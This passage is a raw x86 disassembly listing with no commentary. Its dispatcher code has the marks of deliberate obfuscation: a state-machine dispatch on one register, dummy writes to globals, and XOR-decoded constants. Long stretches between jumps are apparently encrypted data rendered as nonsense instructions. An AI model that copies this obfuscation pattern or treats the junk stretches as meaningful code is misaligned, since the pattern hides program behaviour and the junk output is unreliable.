  40e280:	sbb    al,0x7d
  40e282:	mov    DWORD PTR [ebp-0x18],eax
  40e285:	mov    edi,DWORD PTR [ebp+0x8]
  40e288:	inc    DWORD PTR ds:0x43370b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x4337e3,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x43382b
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433797,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43370b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x4337d7,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43379f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43371b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43381f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x43382b,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x4337df,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43381b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x4337d7,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x433753,0x43375f
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x4337a7,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x4337d3,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x4337d7,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433703,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433703,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433797,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433703,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x4337af,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x43382b
  40e3da:	and    DWORD PTR ds:0x43370b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x433763,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433813
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	popa   
  40e415:	mov    eax,0x98160b1c
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e3f6
  40e421:	xchg   esp,eax
  40e422:	fstp   DWORD PTR [esi+0x2e]
  40e425:	into   
  40e426:	loop   0x40e3c1
  40e428:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e429:	and    bh,BYTE PTR [eax+edi*1]
  40e42c:	sub    DWORD PTR [ebp+0x74],0x6a
  40e430:	outs   dx,DWORD PTR ds:[esi]
  40e431:	inc    edx
  40e432:	cmp    bh,BYTE PTR [eax]
  40e434:	fstp   QWORD PTR [ecx+0x656f0e94]
  40e43a:	sub    ebp,DWORD PTR [edi]
  40e43c:	or     DWORD PTR [ebp+0x32cf76fd],ecx
  40e442:	xor    BYTE PTR [ebx],bl
  40e444:	adc    edi,DWORD PTR ds:0x5ba3bf70
  40e44a:	cmc    
  40e44b:	rcr    DWORD PTR [ecx-0x9],0xb2
  40e44f:	fimul  DWORD PTR [ebp+edx*1-0x65]
  40e453:	fst    DWORD PTR ds:0x38b21be8
  40e459:	(bad)  
  40e45a:	push   ebx
  40e45b:	or     dh,BYTE PTR [edx]
  40e45d:	xor    DWORD PTR [esi+0x2b],ecx
  40e460:	daa    
  40e461:	cmp    al,0xd8
  40e463:	and    eax,0xbc39e4a6
  40e468:	in     al,0xb2
  40e46a:	ins    BYTE PTR es:[edi],dx
  40e46b:	sub    DWORD PTR [edi+esi*8+0x19eae958],ebp
  40e472:	sbb    eax,0xa0bd12e5
  40e477:	mov    ch,0x4d
  40e479:	(bad)  
  40e47a:	xchg   ebp,eax
  40e47b:	enter  0xa58f,0xbb
  40e47f:	iret   
  40e480:	lods   al,BYTE PTR ds:[esi]
  40e481:	test   BYTE PTR [ecx+0x2331d9df],ch
  40e487:	in     al,0x96
  40e489:	repz fistp QWORD PTR [eax]
  40e48c:	repnz clc 
  40e48e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e48f:	mov    bh,0x73
  40e491:	xlat   BYTE PTR fs:[ebx]
  40e493:	push   ebx
  40e494:	xor    DWORD PTR [eax],esp
  40e496:	jno    0x40e4c9
  40e498:	mov    ds:0x37399b35,al
  40e49d:	jae    0x40e44f
  40e49f:	mov    ds:0x48c23604,al
  40e4a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4a5:	xor    ecx,edi
  40e4a7:	jbe    0x40e458
  40e4a9:	repz sbb eax,0xc101705a
  40e4af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4b0:	add    DWORD PTR [esi-0x7a],esp
  40e4b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4b4:	xor    al,0x90
  40e4b6:	mov    bl,BYTE PTR [edx-0x6674b887]
  40e4bc:	jno    0x40e48e
  40e4be:	ret    
  40e4bf:	xchg   esp,eax
  40e4c0:	dec    edx
  40e4c1:	or     bl,ch
  40e4c3:	(bad)  
  40e4c4:	mov    bh,0xda
  40e4c6:	xor    esp,DWORD PTR [esi-0x74b0b537]
  40e4cc:	loop   0x40e4de
  40e4ce:	int3   
  40e4cf:	xchg   BYTE PTR [ebx+0x2bc8934e],al
  40e4d5:	mov    eax,0x7d95a8c6
  40e4da:	mov    bl,0x1f
  40e4dc:	mov    ebp,ebx
  40e4de:	js     0x40e49c
  40e4e0:	jbe    0x40e53f
  40e4e2:	sbb    dh,BYTE PTR [eax]
  40e4e4:	push   esi
  40e4e5:	ror    BYTE PTR [ebx+ebp*1-0x3f],cl
  40e4e9:	iret   
  40e4ea:	test   eax,0xff27178d
  40e4ef:	test   eax,0x9e723ce9
  40e4f4:	(bad)  
  40e4f6:	push   edx
  40e4f7:	jae    0x40e546
  40e4f9:	mov    bh,0x4
  40e4fb:	pop    ss
  40e4fc:	push   es
  40e4fd:	dec    ecx
  40e4fe:	pop    edx
  40e4ff:	mov    esi,0x2dee3339
  40e504:	retf   0x9a1
  40e507:	pop    ebx
  40e508:	rol    eax,cl
  40e50a:	push   esp
  40e50b:	fdivr  DWORD PTR [eax]
  40e50d:	mov    ecx,0x6f252be6
  40e512:	mov    eax,ds:0x92fe31d5
  40e517:	jp     0x40e509
  40e519:	and    BYTE PTR [esi+edx*2],0x4c
  40e51d:	mov    esp,0x726dad5e
  40e522:	pop    es
  40e523:	mov    edx,0x1c605196
  40e528:	jne    0x40e59c
  40e52a:	fcom   DWORD PTR [ecx-0x493f69ee]
  40e530:	cdq    
  40e531:	and    ebp,DWORD PTR [esi+0x5fe9ff46]
  40e537:	fild   QWORD PTR [esi]
  40e539:	dec    ecx
  40e53a:	mov    dl,0x42
  40e53c:	mov    eax,DWORD PTR [ebp-0xc]
  40e53f:	or     DWORD PTR ds:0x4337a3,0x4337eb
  40e549:	xor    eax,esi
  40e54b:	add    eax,ebx
  40e54d:	sbb    DWORD PTR ds:0x4337db,0x4337af
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0xb7f261b8
  40e5b4:	jge    0x40e5de
  40e5b6:	mov    gs,WORD PTR [edx]
  40e5b8:	cdq    
  40e5b9:	jle    0x40e639
  40e5bb:	adc    bh,BYTE PTR [edi+0x7e]
  40e5be:	jle    0x40e552
  40e5c0:	call   0x194d:0x1f5254c3
  40e5c7:	es cmp eax,0x1970ab4a
  40e5cd:	jb     0x40e5a6
  40e5cf:	inc    esp
  40e5d0:	cdq    
  40e5d1:	fldenv [ecx+0x6a]
  40e5d4:	ja     0x40e57e
  40e5d6:	xchg   ebp,eax
  40e5d7:	xor    ecx,edi
  40e5d9:	push   ds
  40e5da:	hlt    
  40e5db:	inc    edx
  40e5dc:	or     BYTE PTR [ecx],ch
  40e5de:	into   
  40e5df:	mov    eax,gs:0x11eba726
  40e5e5:	adc    BYTE PTR [ebp+0x13dc179b],0x70
  40e5ec:	in     eax,dx
  40e5ed:	push   es
  40e5ee:	ja     0x40e648
  40e5f0:	or     cl,BYTE PTR [edx+0x327437d9]
  40e5f6:	jmp    0x40e57c
  40e5f8:	mov    bh,0xb7
  40e5fa:	jmp    0x8c09:0x9cc4e84c
  40e601:	add    eax,DWORD PTR [esi-0x78]
  40e604:	adc    ebp,ecx
  40e606:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e607:	push   edx
  40e608:	xchg   ecx,eax
  40e609:	and    BYTE PTR [esi-0x66],0xa6
  40e60d:	sbb    esp,edx
  40e60f:	jge    0x40e666
  40e611:	add    eax,0xbdff78f5
  40e616:	push   eax
  40e617:	ret    
  40e618:	mov    bh,0x85
  40e61a:	int    0xa9
  40e61c:	mov    dh,0x57
  40e61e:	mov    bl,BYTE PTR [ecx-0x2a5e3bff]
  40e624:	out    0x51,al
  40e626:	xor    BYTE PTR [edi+0x5670df72],dh
  40e62c:	mov    ch,0x80
  40e62e:	push   cs
  40e62f:	into   
  40e630:	aad    0x52
  40e632:	inc    esp
  40e633:	mov    esi,0x17ba72f9
  40e638:	mov    ?,WORD PTR [ecx+0x3724bd18]
  40e63e:	mov    ecx,0x98f02473
  40e643:	inc    esp
  40e644:	xlat   BYTE PTR ds:[ebx]
  40e645:	push   esi
  40e646:	fsubr  DWORD PTR [ebx-0x460a8]
  40e64c:	mov    dh,0x18
  40e64e:	dec    ecx
  40e64f:	mov    ds:0xc0bdb10d,al
  40e654:	test   BYTE PTR [ebx+eax*8],bh
  40e657:	in     al,0x7e
  40e659:	sub    bh,ch
  40e65b:	inc    ecx
  40e65c:	dec    ebp
  40e65d:	sahf   
  40e65e:	dec    ecx
  40e65f:	mov    ebp,0x69829ebe
  40e664:	lods   eax,DWORD PTR ds:[esi]
  40e665:	data16 or BYTE PTR [edx-0x679f59a1],dh
  40e66c:	addr16 retf 
  40e66e:	mov    bl,0x53
  40e670:	dec    esi
  40e671:	mov    al,0xb0
  40e673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e674:	mov    bh,bl
  40e676:	aam    0xbf
  40e678:	imul   ebx,DWORD PTR [eax+esi*1],0x1604f0e0
  40e67f:	(bad)  
  40e680:	push   cs
  40e681:	push   ebx
  40e682:	pusha  
  40e683:	xchg   esp,eax
  40e684:	xor    BYTE PTR [edi+0x2ae7cd01],bh
  40e68a:	mov    esp,0xf3ec315b
  40e68f:	xor    ebx,DWORD PTR [ebx+ecx*8]
  40e692:	fs jle 0x40e678
  40e695:	ror    ebx,0xe7
  40e698:	fdivr  QWORD PTR [esi-0x14faff77]
  40e69e:	xchg   ecx,eax
  40e69f:	out    dx,al
  40e6a0:	inc    edx
  40e6a1:	inc    esp
  40e6a2:	je     0x40e6b2
  40e6a4:	es in  eax,dx
  40e6a6:	sbb    edi,DWORD PTR fs:[ebp-0x2d]
  40e6aa:	and    al,0xd3
  40e6ac:	dec    ecx
  40e6ad:	and    eax,0xe9f23492
  40e6b2:	leave  
  40e6b3:	pop    esp
  40e6b4:	and    al,0x79
  40e6b6:	push   eax
  40e6b7:	add    al,0xf7
  40e6b9:	push   0x43d4e3c5
  40e6be:	mov    DWORD PTR [eax],ecx
  40e6c0:	mov    ah,dh
  40e6c2:	push   ds
  40e6c3:	dec    esp
  40e6c4:	inc    esp
  40e6c5:	shl    BYTE PTR [eax+edx*2-0x45],cl
  40e6c9:	cld    
  40e6ca:	(bad)  
  40e6cb:	sub    edi,edx
  40e6cd:	pop    ss
  40e6ce:	fild   DWORD PTR [edi-0x2a]
  40e6d1:	ja     0x40e6f0
  40e6d3:	sahf   
  40e6d4:	in     eax,0xac
  40e6d6:	xor    al,0xa6
  40e6d8:	or     eax,0x34a1a758
  40e6dd:	cmp    eax,DWORD PTR [ecx+0x0]
  40e6e0:	mov    DWORD PTR [ebp+0x8],eax
  40e6e3:	mov    eax,DWORD PTR [ebp-0x14]
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx+0x1272bb24]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e6cb
  40e704:	int    0x14
  40e706:	push   ss
  40e707:	mov    esi,0xcb01cc56
  40e70c:	xchg   esp,eax
  40e70d:	call   0x356a2f2b
  40e712:	add    BYTE PTR [esi],dl
  40e714:	xchg   esp,eax
  40e715:	in     eax,0x73
  40e717:	scas   eax,DWORD PTR es:[edi]
  40e718:	adc    ch,BYTE PTR [ebx]
  40e71a:	jecxz  0x40e716
  40e71c:	fadd   QWORD PTR [bx]
  40e71f:	fisub  DWORD PTR [ebx]
  40e721:	test   eax,0x7fffb5e3
  40e726:	xor    eax,eax
  40e728:	js     0x40e7a8
  40e72a:	inc    esp
  40e72b:	dec    ecx
  40e72c:	sbb    eax,0x2b752eec
  40e731:	mov    dh,0x31
  40e733:	jmp    0xd3e8:0xc59b0b12
  40e73a:	call   FWORD PTR [eax+0x39ad401c]
  40e740:	push   ds
  40e741:	jl     0x40e6db
  40e743:	sbb    al,0x46
  40e745:	call   DWORD PTR [eax-0x7194e6ed]
  40e74b:	aas    
  40e74c:	jnp    0x40e79e
  40e74e:	jl     0x40e761
  40e750:	fld    DWORD PTR [edx-0x44af6b7f]
  40e756:	pop    ebp
  40e757:	pop    eax
  40e758:	mov    cl,0xd1
  40e75a:	daa    
  40e75b:	inc    ebp
  40e75c:	mov    ds:0x4d124883,al
  40e761:	fs (bad) 
  40e763:	daa    
  40e764:	pop    esp
  40e765:	jns    0x40e6f5
  40e767:	stc    
  40e768:	push   ecx
  40e769:	stc    
  40e76a:	mov    ch,0x17
  40e76c:	sbb    al,0xdb
  40e76e:	in     al,0x64
  40e770:	int    0xb9
  40e772:	adc    al,0xb
  40e774:	fwait
  40e775:	push   ds
  40e776:	dec    edx
  40e777:	or     eax,0x53b63928
  40e77c:	xlat   BYTE PTR ds:[ebx]
  40e77d:	xor    eax,0x2487b779
  40e782:	icebp  
  40e783:	rcl    BYTE PTR [esi+0x3c],0x25
  40e787:	xlat   BYTE PTR ds:[ebx]
  40e788:	aas    
  40e789:	imul   ecx,DWORD PTR [ebp-0x6ca22831],0xffffffcf
  40e790:	fwait
  40e791:	cli    
  40e792:	fisttp WORD PTR [ecx*8+0x7527b754]
  40e799:	and    eax,0xe86ad853
  40e79e:	adc    al,0x4
  40e7a0:	xchg   esp,eax
  40e7a1:	dec    ebp
  40e7a2:	shl    ch,0x70
  40e7a5:	pop    es
  40e7a6:	test   al,0x6b
  40e7a8:	or     bl,BYTE PTR [esi+ebp*8]
  40e7ab:	push   edx
  40e7ac:	xchg   esi,eax
  40e7ad:	xchg   ebx,eax
  40e7ae:	sub    ebp,esp
  40e7b0:	je     0x40e7c2
  40e7b2:	dec    edx
  40e7b3:	cwde   
  40e7b4:	add    esi,esp
  40e7b6:	test   al,0x8c
  40e7b8:	adc    DWORD PTR [ecx+edi*4+0x63bfa9d8],0x6c
  40e7c0:	adc    eax,0x8bed66e5
  40e7c5:	adc    cl,ah
  40e7c7:	loopne 0x40e7ea
  40e7c9:	ret    0x4b81
  40e7cc:	adc    eax,DWORD PTR [ebp-0x158616ae]
  40e7d2:	jbe    0x40e76e
  40e7d4:	cmp    bl,BYTE PTR es:[eax-0xa]
  40e7d8:	in     al,dx
  40e7d9:	adc    al,0xd8
  40e7db:	dec    ecx
  40e7dc:	jb     0x40e783
  40e7de:	shl    DWORD PTR [edi],1
  40e7e0:	(bad)  
  40e7e1:	hlt    
  40e7e2:	scas   eax,DWORD PTR es:[edi]
  40e7e3:	xchg   ebp,eax
  40e7e4:	loopne 0x40e844
  40e7e6:	test   al,0xcc
  40e7e8:	xchg   esi,eax
  40e7e9:	stos   BYTE PTR es:[edi],al
  40e7ea:	stc    
  40e7eb:	xor    eax,0x823ff502
  40e7f0:	cmp    ecx,ebx
  40e7f2:	(bad)  
  40e7f3:	pusha  
  40e7f4:	xor    bh,BYTE PTR [ecx-0x2]
  40e7f7:	lods   eax,DWORD PTR ds:[esi]
  40e7f8:	test   DWORD PTR [ebp-0x44],esp
  40e7fb:	push   esp
  40e7fc:	(bad)  
  40e7fd:	psubusb mm0,mm5
  40e800:	stos   DWORD PTR es:[edi],eax
  40e801:	pop    esi
  40e802:	mov    bh,0xef
  40e804:	pushf  
  40e805:	mov    edi,0xce929329
  40e80a:	imul   ebx,DWORD PTR [ebx+0x69],0xc2136709
  40e811:	shl    BYTE PTR [eax+0x5],1
  40e814:	mov    bl,0x1b
  40e816:	bound  esp,QWORD PTR [ecx+edi*1-0x68]
  40e81a:	cdq    
  40e81b:	mov    ds:0x896f9555,al
  40e820:	inc    ebp
  40e821:	cld    
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e862
  40e854:	jb     0x40e85c
  40e856:	inc    esp
  40e857:	loop   0x40e800
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e8c6
  40e860:	sub    al,0x67
  40e862:	imul   ecx,ebp,0x2a
  40e865:	cmc    
  40e866:	leave  
  40e867:	add    BYTE PTR [eax],0xc5
  40e86a:	adc    dl,al
  40e86c:	out    0x5,al
  40e86e:	xor    DWORD PTR [edx],0x76042ce3
  40e874:	mov    eax,0x66b41fd4
  40e879:	push   0xffffffe0
  40e87b:	pop    edi
  40e87c:	mov    al,ds:0xf971f502
  40e881:	outs   dx,DWORD PTR ds:[esi]
  40e882:	push   ss
  40e883:	in     eax,dx
  40e884:	(bad)  
  40e885:	sti    
  40e886:	js     0x40e8e0
  40e888:	mov    ch,cl
  40e88a:	push   0xffffffaa
  40e88c:	dec    edx
  40e88d:	pop    eax
  40e88e:	cmp    DWORD PTR [edi+edi*1-0x1d8b2973],edi
  40e895:	mov    ?,WORD PTR [ebx+0x3f]
  40e898:	add    eax,0x92e3966
  40e89d:	pmaxsw mm7,QWORD PTR [ebp-0x5002aa2]
  40e8a4:	mov    dh,0x99
  40e8a6:	dec    eax
  40e8a7:	and    ebp,DWORD PTR [edi+0x3c]
  40e8aa:	lahf   
  40e8ab:	fcmovb st,st(7)
  40e8ad:	fisttp DWORD PTR [edx+0xad8b52e]
  40e8b3:	cmp    DWORD PTR [edx],esi
  40e8b5:	or     bl,dh
  40e8b7:	cli    
  40e8b8:	jge    0x40e885
  40e8ba:	xchg   DWORD PTR [edx-0x4a],esp
  40e8bd:	dec    eax
  40e8be:	mov    bl,BYTE PTR [eax+esi*8-0x4e]
  40e8c2:	aad    0x8f
  40e8c4:	sub    cl,BYTE PTR [edx]
  40e8c6:	data16 xor BYTE PTR ds:0x62972b2,0xd4
  40e8ce:	clc    
  40e8cf:	and    edx,esi
  40e8d1:	popf   
  40e8d2:	outs   dx,BYTE PTR ds:[esi]
  40e8d3:	jge    0x40e893
  40e8d5:	in     eax,0xa
  40e8d7:	cmp    dh,0x88
  40e8da:	push   ds
  40e8db:	xlat   BYTE PTR ds:[ebx]
  40e8dc:	mov    ds:0x150a1230,eax
  40e8e1:	shl    DWORD PTR ds:[ebp-0x64],1
  40e8e5:	sub    dl,BYTE PTR [esi]
  40e8e7:	push   ebx
  40e8e8:	sar    BYTE PTR [edx],cl
  40e8ea:	fisubr DWORD PTR [esi+0x5c5eacb4]
  40e8f0:	pop    ebx
  40e8f1:	xor    ebx,DWORD PTR [eax]
  40e8f3:	or     BYTE PTR [edi+0x1],cl
  40e8f6:	cmp    al,ah
  40e8f8:	in     al,0x1c
  40e8fa:	push   0x154a9be3
  40e8ff:	ja     0x40e957
  40e901:	cli    
  40e902:	add    DWORD PTR [eax+0x698dfeb8],eax
  40e908:	dec    ebp
  40e909:	mov    eax,0x7b721f45
  40e90e:	addr16 dec ebx
  40e910:	inc    esi
  40e911:	cs jo  0x40e8df
  40e914:	aas    
  40e915:	and    BYTE PTR [ebx-0x32],dh
  40e918:	(bad)  
  40e919:	sub    ah,al
  40e91b:	test   al,0xfd
  40e91d:	add    al,0xf4
  40e91f:	mov    al,ds:0x5cf44273
  40e924:	dec    ebp
  40e925:	push   ebp
  40e926:	outs   dx,BYTE PTR ds:[esi]
  40e927:	mov    esp,DWORD PTR [edi-0x2]
  40e92a:	cmp    BYTE PTR [ecx-0x27409efa],dl
  40e930:	mov    bh,al
  40e932:	lds    esi,FWORD PTR [edx]
  40e934:	pop    ebp
  40e935:	ret    0xcf16
  40e938:	(bad)  
  40e939:	(bad)  [ecx+0x3e]
  40e93c:	sar    DWORD PTR [ebp-0x11],1
  40e93f:	lods   al,BYTE PTR ds:[esi]
  40e940:	add    ebp,DWORD PTR [esi+0x2ee1e547]
  40e946:	outs   dx,DWORD PTR ds:[esi]
  40e947:	(bad)  [edx-0x40]
  40e94a:	xchg   ebp,eax
  40e94b:	add    eax,ecx
  40e94d:	stc    
  40e94e:	sahf   
  40e94f:	jge    0x40e8d6
  40e951:	push   ebp
  40e952:	rcl    BYTE PTR [eax+eax*4+0x68],1
  40e956:	add    DWORD PTR [ebp-0x4e40b36a],esi
  40e95c:	push   0x77
  40e95e:	hlt    
  40e95f:	xor    cl,BYTE PTR [edx+0x7c78f943]
  40e965:	test   DWORD PTR [esi-0x30],edx
  40e968:	add    esi,eax
  40e96a:	cli    
  40e96b:	mov    edx,0x6bcdb1e5
  40e970:	push   bp
  40e972:	(bad)  
  40e973:	popa   
  40e974:	addr16 jp 0x40e9df
  40e977:	push   ss
  40e978:	dec    eax
  40e979:	jge    0x40e90e
  40e97b:	jne    0x40e2bf
  40e981:	mov    eax,DWORD PTR [ebp+0xc]
  40e984:	pop    edi
  40e985:	xor    eax,esi
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0xae103c1d
  40e99c:	adc    eax,DWORD PTR [esi+0x127e7ea4]
  40e9a2:	jg     0x40ea22
  40e9a4:	jle    0x40ea24
  40e9a6:	dec    edi
  40e9a7:	xor    bl,BYTE PTR [esi]
  40e9a9:	clc    
  40e9aa:	ror    BYTE PTR fs:[esi],1
  40e9ad:	push   ecx
  40e9ae:	sub    dl,ah
  40e9b0:	xor    al,0xf1
  40e9b2:	mov    dh,0xbe
  40e9b4:	push   ebp
  40e9b5:	xchg   ebp,eax
  40e9b6:	inc    esp
  40e9b7:	push   0x1c
  40e9b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9ba:	sbb    eax,0x70615625
  40e9bf:	data16 mov ds,WORD PTR [esi]
  40e9c2:	shr    dl,1
  40e9c4:	stc    
  40e9c5:	fs clc 
  40e9c7:	pop    ebp
  40e9c8:	aad    0x94
  40e9ca:	push   es
  40e9cb:	or     cl,dh
  40e9cd:	or     eax,0x1d86d7f
  40e9d3:	lahf   
  40e9d4:	mov    ebx,0xcc006626
  40e9d9:	cmp    cl,bh
  40e9db:	jb     0x40ea03
  40e9dd:	mul    BYTE PTR [ebx+0x4ca767a0]
  40e9e3:	pop    ebp
  40e9e4:	or     al,0xdb
  40e9e6:	dec    ecx
  40e9e7:	jb     0x40e96b
  40e9e9:	mov    DWORD PTR [edi+0x7e],esp
  40e9ec:	ins    BYTE PTR es:[edi],dx
  40e9ed:	cmp    edi,eax
  40e9ef:	mov    ds:0x5829a1c0,eax
  40e9f4:	pop    edi
  40e9f5:	mov    esi,0x4217bd8b
  40e9fa:	xor    edi,esi
  40e9fc:	adc    eax,0x441a72b1
  40ea01:	xchg   ecx,eax
  40ea02:	out    0xb5,al
  40ea04:	fst    QWORD PTR [ebp+0xa5cb19a]
  40ea0a:	ret    0xeaef
  40ea0d:	fidivr WORD PTR [eax+0x76b8c1bd]
  40ea13:	dec    esi
  40ea14:	fwait
  40ea15:	add    eax,0x8a66957b
  40ea1a:	imul   ecx,DWORD PTR ds:0x1e6cc7c,0x69
  40ea21:	lods   eax,DWORD PTR ds:[esi]
  40ea22:	(bad)  
  40ea23:	cmp    eax,0x646db7c6
  40ea28:	std    
  40ea29:	pop    eax
  40ea2a:	mov    ds:0xdef0e79c,eax
  40ea2f:	xor    al,0x41
  40ea31:	imul   esi,DWORD PTR [ebx+0x51],0xf
  40ea35:	xchg   BYTE PTR [edi+0x602a6f73],cl
  40ea3b:	or     eax,0x7976193b
  40ea40:	mov    eax,ds:0x3a2a3649
  40ea45:	or     dh,ch
  40ea47:	xor    edx,DWORD PTR ds:0xfd1425d5
  40ea4d:	iret   
  40ea4e:	jge    0x40e9d5
  40ea50:	in     al,0x50
  40ea52:	js     0x40ea39
  40ea54:	xor    ebx,DWORD PTR [ebx+0x9e94f]
  40ea5a:	sbb    DWORD PTR [eax+edx*2],edi
  40ea5d:	xor    eax,0x525cfbd5
  40ea62:	fistp  QWORD PTR [ebx+esi*2-0x79bf666c]
  40ea69:	(bad)  
  40ea6a:	sbb    DWORD PTR [esi+0x31],edi
  40ea6d:	mov    DWORD PTR [ebp-0x71],esi
  40ea70:	ins    DWORD PTR es:[edi],dx
  40ea71:	out    dx,eax
  40ea72:	push   0x68
  40ea74:	js     0x40ea3f
  40ea76:	mov    ecx,0x28214e75
  40ea7b:	mov    edi,0x25c76c69
  40ea80:	fcomp  DWORD PTR [esi]
  40ea82:	mov    ebp,0x98344f05
  40ea87:	add    ecx,edi
  40ea89:	out    0x2a,eax
  40ea8b:	sbb    al,0xfd
  40ea8d:	mov    eax,0x18d480ca
  40ea92:	jo     0x40eab0
  40ea94:	xor    eax,0xdca83fa1
  40ea99:	repnz push es
  40ea9b:	mov    eax,0x4c656581
  40eaa0:	mov    ch,0x85
  40eaa2:	inc    ecx
  40eaa3:	inc    ecx
  40eaa4:	mov    ecx,ecx
  40eaa6:	jbe    0x40ea72
  40eaa8:	sub    eax,0xa793f259
  40eaad:	lods   al,BYTE PTR ds:[esi]
  40eaae:	(bad)  
  40eaaf:	push   esp
  40eab0:	mov    BYTE PTR ds:0x2ed06f65,dh
  40eab6:	jle    0x40eac3
  40eab8:	adc    eax,0xe0a26c4
  40eabd:	xchg   edx,eax
  40eabe:	test   al,0x83
  40eac0:	scas   al,BYTE PTR es:[edi]
  40eac1:	add    eax,ebx
